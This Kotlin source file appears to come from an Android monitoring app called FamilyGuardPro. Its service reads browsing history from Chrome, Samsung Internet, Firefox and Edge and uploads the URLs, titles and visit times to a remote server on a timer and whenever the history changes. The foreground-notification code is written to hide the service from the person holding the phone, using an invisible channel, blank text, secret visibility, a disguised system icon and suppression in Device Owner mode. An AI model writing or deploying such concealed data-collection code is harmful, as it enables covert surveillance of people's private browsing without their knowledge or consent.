package com.familyguardpro.services

import android.app.Service
import android.content.ContentResolver
import android.content.Intent
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

/**
 * Browser History Monitoring Service
 * Monitors browsing history from Chrome, Samsung Internet, and other browsers
 */
class BrowserHistoryService : Service() {
    
    companion object {
        private const val TAG = "BrowserHistoryService"
        private const val NOTIFICATION_ID = 1022
        private const val SYNC_INTERVAL_MS = 15 * 60 * 1000L // 15 minutes
        
        // Browser content URIs
        private val CHROME_HISTORY_URI = Uri.parse("content://com.android.chrome.browser/bookmarks")
        private val SAMSUNG_HISTORY_URI = Uri.parse("content://com.sec.android.app.sbrowser.browser/bookmarks")
    }
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var lastSyncTime = 0L
    private val historyCache = mutableSetOf<String>() // URLs already synced
    
    // PERFORMANCE FIX: Debounce browser history sync
    private var syncScheduled = false
    private val SYNC_DEBOUNCE_MS = 30_000L // 30 seconds debounce
    
    private var chromeObserver: ContentObserver? = null
    private var samsungObserver: ContentObserver? = null
    
    override fun onCreate() {
        super.onCreate()
        loadCachedHistory()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Always call startForeground() first to avoid crash
        startForeground()
        
        when (intent?.action) {
            "SYNC_NOW" -> syncBrowserHistory()
            else -> {
                startHistoryMonitoring()
            }
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        unregisterObservers()
    }
    
    private fun startForeground() {
        // Check if Device Owner mode - use invisible channel
        val doManager = try {
            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
        } catch (e: Exception) { null }
        
        val channelId = if (doManager?.isDeviceOwner() == true) {
            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
        } else {
            FamilyGuardApp.NOTIFICATION_CHANNEL_SYNC
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_system_service_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }
    
    private fun startHistoryMonitoring() {
        // Register content observers for browser changes
        registerBrowserObservers()
        
        // Start periodic sync
        serviceScope.launch {
            while (isActive) {
                syncBrowserHistory()
                delay(SYNC_INTERVAL_MS)
            }
        }
    }
    
    private fun registerBrowserObservers() {
        try {
            chromeObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    Log.d(TAG, "Chrome history changed")
                    // PERFORMANCE FIX: Debounce syncs (only every 30 seconds)
                    if (syncScheduled) return
                    
                    syncScheduled = true
                    serviceScope.launch {
                        delay(SYNC_DEBOUNCE_MS) // Wait 30 seconds
                        try {
                            syncBrowserHistory()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error syncing browser history", e)
                        } finally {
                            syncScheduled = false
                        }
                    }
                }
            }
            
            contentResolver.registerContentObserver(
                CHROME_HISTORY_URI,
                true,
                chromeObserver!!
            )
            
        } catch (e: Exception) {
            Log.w(TAG, "Could not register Chrome observer: ${e.message}")
        }
        
        try {
            samsungObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    Log.d(TAG, "Samsung browser history changed")
                    // PERFORMANCE FIX: Debounce syncs (only every 30 seconds)
                    if (syncScheduled) return
                    
                    syncScheduled = true
                    serviceScope.launch {
                        delay(SYNC_DEBOUNCE_MS) // Wait 30 seconds
                        try {
                            syncBrowserHistory()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error syncing browser history", e)
                        } finally {
                            syncScheduled = false
                        }
                    }
                }
            }
            
            contentResolver.registerContentObserver(
                SAMSUNG_HISTORY_URI,
                true,
                samsungObserver!!
            )
            
        } catch (e: Exception) {
            Log.w(TAG, "Could not register Samsung browser observer: ${e.message}")
        }
    }
    
    private fun unregisterObservers() {
        chromeObserver?.let { contentResolver.unregisterContentObserver(it) }
        samsungObserver?.let { contentResolver.unregisterContentObserver(it) }
    }
    
    private fun syncBrowserHistory() {
        serviceScope.launch {
            try {
                val app = applicationContext as FamilyGuardApp
                val deviceId = app.preferenceManager.getDeviceId()
                
                if (deviceId.isEmpty()) {
                    Log.w(TAG, "No device ID, skipping history sync")
                    return@launch
                }
                
                val allHistory = mutableListOf<BrowserHistoryEntry>()
                
                // Collect history from all browsers
                allHistory.addAll(getChromeHistory())
                allHistory.addAll(getSamsungBrowserHistory())
                allHistory.addAll(getFirefoxHistory())
                allHistory.addAll(getEdgeHistory())
                
                // Filter out already synced entries
                val newEntries = allHistory.filter { entry ->
                    val key = "${entry.url}_${entry.visitTime}"
                    !historyCache.contains(key)
                }
                
                if (newEntries.isEmpty()) {
                    Log.d(TAG, "No new browser history to sync")
                    return@launch
                }
                
                // Upload to server
                val historyJson = JSONArray()
                newEntries.forEach { entry ->
                    historyJson.put(JSONObject().apply {
                        put("url", entry.url)
                        put("title", entry.title)
                        put("visitTime", entry.visitTime)
                        put("browser", entry.browser)
                    })
                    
                    // Add to cache
                    historyCache.add("${entry.url}_${entry.visitTime}")
                }
                
                ApiClient.syncBrowserHistory(deviceId, historyJson)
                Log.d(TAG, "Synced ${newEntries.size} browser history entries")
                
                // Save cache
                saveCachedHistory()
                lastSyncTime = System.currentTimeMillis()
                
            } catch (e: Exception) {
                Log.e(TAG, "Error syncing browser history", e)
            }
        }
    }
    
    private fun getChromeHistory(): List<BrowserHistoryEntry> {
        val entries = mutableListOf<BrowserHistoryEntry>()
        
        try {
            // Chrome stores history in its own database, we try to read from content provider
            val projection = arrayOf("_id", "url", "title", "date", "visits")
            
            contentResolver.query(
                CHROME_HISTORY_URI,
                projection,
                "bookmark = 0", // Only history, not bookmarks
                null,
                "date DESC LIMIT 100"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    entries.add(BrowserHistoryEntry(
                        url = cursor.getStringOrDefault("url", ""),
                        title = cursor.getStringOrDefault("title", ""),
                        visitTime = cursor.getLongOrDefault("date", 0),
                        browser = "Chrome"
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not read Chrome history: ${e.message}")
        }
        
        return entries
    }
    
    private fun getSamsungBrowserHistory(): List<BrowserHistoryEntry> {
        val entries = mutableListOf<BrowserHistoryEntry>()
        
        try {
            contentResolver.query(
                SAMSUNG_HISTORY_URI,
                null,
                "bookmark = 0",
                null,
                "date DESC LIMIT 100"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    entries.add(BrowserHistoryEntry(
                        url = cursor.getStringOrDefault("url", ""),
                        title = cursor.getStringOrDefault("title", ""),
                        visitTime = cursor.getLongOrDefault("date", 0),
                        browser = "Samsung Internet"
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not read Samsung browser history: ${e.message}")
        }
        
        return entries
    }
    
    private fun getFirefoxHistory(): List<BrowserHistoryEntry> {
        val entries = mutableListOf<BrowserHistoryEntry>()
        
        try {
            val firefoxUri = Uri.parse("content://org.mozilla.firefox.db.browser/bookmarks")
            
            contentResolver.query(
                firefoxUri,
                null,
                null,
                null,
                "date DESC LIMIT 100"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    entries.add(BrowserHistoryEntry(
                        url = cursor.getStringOrDefault("url", ""),
                        title = cursor.getStringOrDefault("title", ""),
                        visitTime = cursor.getLongOrDefault("date", 0),
                        browser = "Firefox"
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not read Firefox history: ${e.message}")
        }
        
        return entries
    }
    
    private fun getEdgeHistory(): List<BrowserHistoryEntry> {
        val entries = mutableListOf<BrowserHistoryEntry>()
        
        try {
            val edgeUri = Uri.parse("content://com.microsoft.emmx.browser/bookmarks")
            
            contentResolver.query(
                edgeUri,
                null,
                null,
                null,
                "date DESC LIMIT 100"
            )?.use { cursor ->
                while (cursor.moveToNext()) {
                    entries.add(BrowserHistoryEntry(
                        url = cursor.getStringOrDefault("url", ""),
                        title = cursor.getStringOrDefault("title", ""),
                        visitTime = cursor.getLongOrDefault("date", 0),
                        browser = "Edge"
                    ))
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not read Edge history: ${e.message}")
        }
        
        return entries
    }
    
    private fun loadCachedHistory() {
        try {
            val app = applicationContext as FamilyGuardApp
            val prefs = app.getSharedPreferences("browser_history_cache", MODE_PRIVATE)
            val cached = prefs.getStringSet("synced_entries", emptySet()) ?: emptySet()
            historyCache.addAll(cached)
            Log.d(TAG, "Loaded ${historyCache.size} cached history entries")
        } catch (e: Exception) {
            Log.e(TAG, "Error loading history cache", e)
        }
    }
    
    private fun saveCachedHistory() {
        try {
            val app = applicationContext as FamilyGuardApp
            val prefs = app.getSharedPreferences("browser_history_cache", MODE_PRIVATE)
            
            // Keep only last 1000 entries in cache
            val toSave = if (historyCache.size > 1000) {
                historyCache.toList().takeLast(1000).toSet()
            } else {
                historyCache
            }
            
            prefs.edit().putStringSet("synced_entries", toSave).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error saving history cache", e)
        }
    }
    
    private fun Cursor.getStringOrDefault(column: String, default: String): String {
        return try {
            val index = getColumnIndex(column)
            if (index >= 0) getString(index) ?: default else default
        } catch (e: Exception) {
            default
        }
    }
    
    private fun Cursor.getLongOrDefault(column: String, default: Long): Long {
        return try {
            val index = getColumnIndex(column)
            if (index >= 0) getLong(index) else default
        } catch (e: Exception) {
            default
        }
    }
    
    data class BrowserHistoryEntry(
        val url: String,
        val title: String,
        val visitTime: Long,
        val browser: String
    )
}
